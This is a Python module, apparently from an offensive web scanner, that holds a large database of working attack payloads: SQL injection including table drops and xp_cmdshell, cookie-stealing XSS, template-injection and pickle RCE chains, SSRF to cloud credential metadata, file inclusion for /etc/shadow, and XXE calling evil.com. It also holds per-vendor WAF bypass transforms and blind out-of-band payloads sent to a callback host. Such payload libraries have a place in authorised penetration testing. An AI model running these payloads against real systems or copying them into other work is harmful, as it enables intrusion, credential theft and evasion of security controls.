"""
nexsus/core/payload_manager.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Advanced payload manager with:
  • 400+ built-in payloads across 15 vulnerability classes
  • WAF-aware bypass transforms (per-WAF rule sets)
  • Context-aware encoding (HTML, URL, JS, JSON, XML)
  • Blind injection helpers (time-based, OOB)
  • Payload mutation engine (case, comment, encoding variants)
  • Polyglot payloads for multi-context injection
"""
import random
import urllib.parse
import base64
import html
from typing import Optional
from nexsus.config import Config


# ── Payload database ──────────────────────────────────────────────────────────

_PAYLOADS: dict[str, list[str]] = {

    # ── SQL Injection ─────────────────────────────────────────────────────────
    "sqli": [
        # Classic
        "' OR '1'='1",
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,@@version,3--",
        "' UNION SELECT 1,database(),3--",
        "' UNION ALL SELECT 1,2,group_concat(table_name),4 FROM information_schema.tables--",
        "' UNION SELECT 1,user(),3--",
        "' UNION SELECT 1,load_file('/etc/passwd'),3--",
        # Boolean-based blind
        "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND BINARY(SELECT password FROM users LIMIT 1) LIKE 'a%'--",
        # Time-based blind
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",           # MSSQL
        "' AND BENCHMARK(5000000,MD5(1))--",
        "'; SELECT pg_sleep(5)--",               # PostgreSQL
        "' OR IF(1=1,SLEEP(5),0)--",
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        # Stacked queries
        "'; INSERT INTO users(username,password) VALUES('hacked','hacked')--",
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('id')--",           # MSSQL RCE
        # Second-order
        "admin'/*",
        "0' OR 'x'='x",
        # SQLite
        "' UNION SELECT sqlite_version()--",
        # Oracle
        "' UNION SELECT NULL FROM DUAL--",
        "' UNION SELECT 1,banner FROM v$version WHERE ROWNUM=1--",
    ],

    # ── Cross-Site Scripting ──────────────────────────────────────────────────
    "xss": [
        # Classic
        "<script>alert(document.domain)</script>",
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<select onchange=alert(1)><option>x</option></select>",
        "<video><source onerror=alert(1)>",
        "<audio src onerror=alert(1)>",
        "<form><button formaction=javascript:alert(1)>x</button></form>",
        # SVG
        "<svg/onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><use href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>\">",
        # JavaScript protocol
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        # Template / framework injection
        "{{constructor.constructor('alert(1)')()}}",   # AngularJS
        "${alert(1)}",
        "<%=alert(1)%>",
        "#{alert(1)}",
        # DOM-based
        "\"><img src=1 onerror=alert(1)>",
        "'><img src=1 onerror=alert(1)>",
        # Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
        # CSS injection
        "<style>@import'http://evil.com/steal.css'</style>",
        # Iframe
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<iframe src=\"javascript:alert(1)\">",
        # Unicode / encoding evasion
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
    ],

    # ── Server-Side Template Injection ────────────────────────────────────────
    "ssti": [
        # Detection
        "{{7*7}}",
        "${7*7}",
        "{{7*'7'}}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "@{7*7}",
        # Jinja2 / Twig RCE
        "{{config}}",
        "{{config.items()}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{'id'|popen|read}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        # Freemarker RCE
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # Velocity RCE
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))\n#set($chr=$x.class.forName('java.lang.Character'))\n#set($str=$x.class.forName('java.lang.String'))\n#set($ex=$rt.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        # ERB / Ruby
        "<%= `id` %>",
        "<%= system('id') %>",
        # Smarty
        "{php}echo `id`;{/php}",
        "{self::$_smarty_vars['SCRIPT_NAME']}",
        # Tornado
        "{% import os %}{{os.popen('id').read()}}",
        # Pebble (Java)
        "{{'a'*7}}",
    ],

    # ── SSRF ─────────────────────────────────────────────────────────────────
    "ssrf": [
        # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://[fd00:ec2::254]/latest/meta-data/",
        # GCP metadata
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/",
        # Azure metadata
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # Internal services
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8080/admin",
        "http://127.0.0.1:6379/",       # Redis
        "http://127.0.0.1:9200/",       # Elasticsearch
        "http://127.0.0.1:27017/",      # MongoDB
        "http://localhost/server-status",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://0/",
        # Protocol schemes
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://localhost:11211/info",
        "gopher://localhost:6379/_INFO%0a",
        "gopher://127.0.0.1:9200/",
        # DNS rebinding bypass
        "http://localtest.me/",
        "http://spoofed.burpcollaborator.net/",
        # URL parser confusion
        "http://127.0.0.1:80@evil.com/",
        "http://evil.com\\@127.0.0.1/",
        # IPv6
        "http://[::ffff:127.0.0.1]/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    ],

    # ── Path / Local File Inclusion ───────────────────────────────────────────
    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252fetc%252fpasswd",
        "..;/..;/etc/passwd",
        "/etc/passwd%00",               # null byte (older PHP)
        "/etc/passwd%00.jpg",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",
        "expect://id",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/var/log/apache2/access.log",   # log poisoning
        "/var/log/nginx/access.log",
        "/etc/hosts",
        "/etc/shadow",
        "/etc/os-release",
    ],

    # ── Remote Code Execution / Command Injection ─────────────────────────────
    "rce": [
        "; id",
        "| id",
        "& id",
        "` id `",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; sleep 5",
        "| sleep 5",
        "& ping -c5 127.0.0.1 &",
        "$(sleep 5)",
        "0; ping -c5 127.0.0.1",
        "%0aid",
        "\nid",
        "\r\nid",
        "; ls -la /",
        "| ls -la /",
        "&&id",
        "||id",
        "; env",
        ";{IFS}cat${IFS}/etc/passwd",     # IFS bypass
        "$IFS$()cat$IFS/etc/passwd",
    ],

    # ── NoSQL Injection ───────────────────────────────────────────────────────
    "nosqli": [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$gt": -1}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$exists": true}',
        'username[$ne]=x&password[$ne]=x',
        'username[$gt]=&password[$gt]=',
        'username[$regex]=.*&password[$regex]=.*',
        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
        # MongoDB operator injection
        "' || 1==1//",
        "' || '1'=='1",
        "; return 1==1; var x=\"",
    ],

    # ── LDAP Injection ────────────────────────────────────────────────────────
    "ldapi": [
        "*)(uid=*",
        "*)(&(objectclass=*",
        "admin*)((|userPassword=*)",
        "*(|(uid=*",
        "*(|(password=*",
        "*(|(objectclass=*",
        "admin)(|(password=*)",
        "*(objectClass=*)(objectClass=",
        "*)(mail=*)(mail=",
    ],

    # ── XXE ───────────────────────────────────────────────────────────────────
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo>bar</foo>',
        # XInclude
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    ],

    # ── Open Redirect ─────────────────────────────────────────────────────────
    "open_redirect": [
        "//evil.com",
        "//evil.com/",
        "https://evil.com",
        "https://evil.com/",
        "\\\\evil.com",
        "/\\evil.com",
        "///evil.com",
        "////evil.com",
        "https:evil.com",
        "https://////evil.com",
        "%2F%2Fevil.com",
        "/%09/evil.com",
        "/;@evil.com",
        "/.evil.com",
        "/evil.com:%40@real.com",
        "https://real.com@evil.com",
        "javascript:window.location='https://evil.com'",
    ],

    # ── CORS Misconfiguration ────────────────────────────────────────────────
    "cors": [
        "Origin: https://evil.com",
        "Origin: null",
        "Origin: https://sub.evil.com",
        "Origin: https://real.com.evil.com",
        "Origin: https://realcom.evil.com",
        "Origin: https://evildomain.com",
    ],

    # ── JWT Attacks ──────────────────────────────────────────────────────────
    "jwt": [
        # None algorithm
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
        # Algorithm confusion / header injection
        '{"alg":"none"}',
        '{"alg":"HS256","typ":"JWT"}',
        # Weak secrets (tested by auth module)
        "secret", "password", "jwt", "test", "1234567890",
        "", "null", "undefined",
    ],

    # ── GraphQL ──────────────────────────────────────────────────────────────
    "graphql": [
        '{"query":"{__schema{queryType{name}}}"}',
        '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}',
        '{"query":"query{__typename}"}',
        # Introspection disable bypass
        '{"query":"{__schema\n{queryType{name}}}"}',
        # Batch query abuse
        '[{"query":"query{users{id,email}}"},{"query":"query{admin{password}}"}]',
        # Field suggestion
        '{"query":"{user{id,emali}}"}',
    ],

    # ── CSRF ─────────────────────────────────────────────────────────────────
    "csrf": [
        # Header probe values (checked by auth module, not injected)
        "Origin: null",
        "Referer: ",
        "X-Requested-With: XMLHttpRequest",
    ],

    # ── Deserialisation (Java/PHP) ────────────────────────────────────────────
    "deserialization": [
        # PHP Object injection
        'O:8:"stdClass":0:{}',
        'O:19:"PHPObjectInjection":1:{s:6:"method";s:4:"exec";s:4:"cmd";s:2:"id";}',
        # Java URLDNS gadget (triggers DNS lookup)
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABAwABSQAACWxvYWRGYWN0b3J4cD8A",
        # Python pickle RCE
        "gASVJQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
    ],
}


# ── WAF bypass transform rules ─────────────────────────────────────────────────

_WAF_BYPASS_RULES: dict[str, dict[str, list]] = {
    "cloudflare": {
        "sqli": [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("OR", "||"),
            lambda p: p.replace("AND", "&&"),
            lambda p: p.replace("UNION", "UN%00ION"),
            lambda p: p.replace("SELECT", "SEL%0aECT"),
        ],
        "xss": [
            lambda p: p.replace("<script>", "<script/x>"),
            lambda p: p.replace("alert(", "confirm("),
            lambda p: p.replace("alert(", "prompt("),
            lambda p: p.replace("<", "\x3c"),
        ],
        "generic": [
            lambda p: urllib.parse.quote(p, safe=""),
            lambda p: p.replace(" ", "\t"),
            lambda p: p.replace(" ", "%09"),
            lambda p: p.replace("=", "%3d"),
        ],
    },
    "akamai": {
        "sqli": [
            lambda p: p.replace(" ", "+"),
            lambda p: p.replace("'", "%27"),
            lambda p: p.replace("UNION", "uNiOn"),
            lambda p: p.replace("SELECT", "SeLeCt"),
        ],
        "xss": [
            lambda p: p.replace("alert", "al\x65rt"),
            lambda p: p.replace("script", "sc\rip\tt"),
        ],
        "generic": [
            lambda p: p.replace(" ", "%20"),
            lambda p: urllib.parse.quote(p, safe=""),
        ],
    },
    "aws_waf": {
        "sqli": [
            lambda p: p.replace(" ", "/*!*/"),
            lambda p: p.replace("UNION", "UNiOn"),
            lambda p: p.replace("SELECT", "sElEcT"),
            lambda p: p + "%00",
        ],
        "xss": [
            lambda p: p.replace("<script>", "<svg/onload="),
            lambda p: p.replace("alert(1)", "window['alert'](1)"),
        ],
        "generic": [
            lambda p: p.replace(" ", "%0a"),
            lambda p: base64.b64encode(p.encode()).decode(),
        ],
    },
    "modsecurity": {
        "sqli": [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("OR", "O\x00R"),
            lambda p: p.replace("SELECT", "SE\x00LECT"),
            lambda p: p.replace("UNION", "UNI\x00ON"),
            lambda p: "/*!50000" + p.lstrip("'") + "*/",
        ],
        "xss": [
            lambda p: p.replace("<script>", "<scr\x00ipt>"),
            lambda p: p.replace("alert", "al&#101;rt"),
            lambda p: p.replace("onerror", "o\x00nerror"),
        ],
        "generic": [
            lambda p: p.replace(" ", "%20"),
            lambda p: p.replace("=", "%3d"),
        ],
    },
}

# Generic fallback transforms
_GENERIC_TRANSFORMS = [
    lambda p: p.replace(" ", "%20"),
    lambda p: urllib.parse.quote(p, safe="'\"<>"),
    lambda p: p.replace(" ", "/**/"),
    lambda p: p.replace(" ", "\t"),
    lambda p: "".join(
        c.upper() if (i % 2 == 0 and c.isalpha()) else c.lower()
        for i, c in enumerate(p)
    ),
]


class PayloadManager:
    """
    Provides payloads for a given vulnerability type,
    optionally transformed to bypass a specific WAF.
    """

    def __init__(self, waf_type: Optional[str] = None):
        self.waf_type = waf_type

    # ── Public API ─────────────────────────────────────────────────────────────

    def get_payloads(
        self,
        vuln_type: str,
        context: Optional[str] = None,
        limit: Optional[int] = None,
    ) -> list[str]:
        """
        Return payloads for *vuln_type*, transformed for the current WAF.

        Parameters
        ----------
        vuln_type : str
            Key into payload DB (e.g. "sqli", "xss").
        context : str, optional
            Encoding context: "html", "url", "json", "js", "xml".
        limit : int, optional
            Maximum payloads to return (defaults to all).
        """
        base = list(_PAYLOADS.get(vuln_type, []))
        if not base:
            return []

        payloads = base if not limit else random.sample(base, min(limit, len(base)))

        if self.waf_type:
            payloads = self._apply_waf_bypass(payloads, vuln_type)

        if context:
            payloads = [self._encode_context(p, context) for p in payloads]

        return payloads

    def get_mutated(self, vuln_type: str, n: int = 50) -> list[str]:
        """
        Return *n* mutated variants of the base payloads.
        Useful for fuzzing when standard payloads fail.
        """
        base    = _PAYLOADS.get(vuln_type, [])
        mutated = []
        pool    = base * (n // max(len(base), 1) + 1)
        for p in random.sample(pool, min(n, len(pool))):
            fn = random.choice(_GENERIC_TRANSFORMS)
            mutated.append(fn(p))
        return list(dict.fromkeys(mutated))   # dedup while preserving order

    def get_blind(self, vuln_type: str, callback_url: str = "") -> list[str]:
        """
        Return OOB / time-based blind payloads.
        If *callback_url* is set, embed it in SSRF / DNS payloads.
        """
        cb = callback_url or Config.BLIND_VULN_CALLBACK or "http://callback.local"
        blind: dict[str, list[str]] = {
            "sqli": [
                f"' AND SLEEP(5)--",
                f"'; WAITFOR DELAY '0:0:5'--",
                f"' AND (SELECT LOAD_FILE('\\\\\\\\{cb}\\\\share'))--",
                f"' UNION SELECT 1,LOAD_FILE('\\\\\\\\{cb}\\\\a')--",
            ],
            "ssrf": [
                f"http://{cb}/ssrf-test",
                f"gopher://{cb}/_x",
            ],
            "xxe": [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{cb}/xxe"> %xxe;]><foo/>',
            ],
            "ssti": [
                "{{''.__class__.__mro__[1].__subclasses__()[267](['sleep','5'],stdout=-1).communicate()}}",
            ],
        }
        return blind.get(vuln_type, _PAYLOADS.get(vuln_type, []))

    def all_types(self) -> list[str]:
        return list(_PAYLOADS.keys())

    # ── Internal transforms ────────────────────────────────────────────────────

    def _apply_waf_bypass(self, payloads: list[str], vuln_type: str) -> list[str]:
        rules = _WAF_BYPASS_RULES.get(self.waf_type or "", {})
        transforms = rules.get(vuln_type, rules.get("generic", _GENERIC_TRANSFORMS))
        if not transforms:
            return payloads
        result = []
        for p in payloads:
            # Apply one random transform
            fn = random.choice(transforms)
            try:
                result.append(fn(p))
            except Exception:
                result.append(p)
        return result

    @staticmethod
    def _encode_context(payload: str, context: str) -> str:
        if context == "url":
            return urllib.parse.quote(payload, safe="")
        elif context == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        elif context == "html":
            return html.escape(payload)
        elif context == "json":
            return json_escape(payload)
        elif context == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif context == "hex":
            return payload.encode().hex()
        return payload


def json_escape(s: str) -> str:
    """Escape a string for safe embedding inside a JSON string value."""
    return s.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n").replace("\r", "\\r")
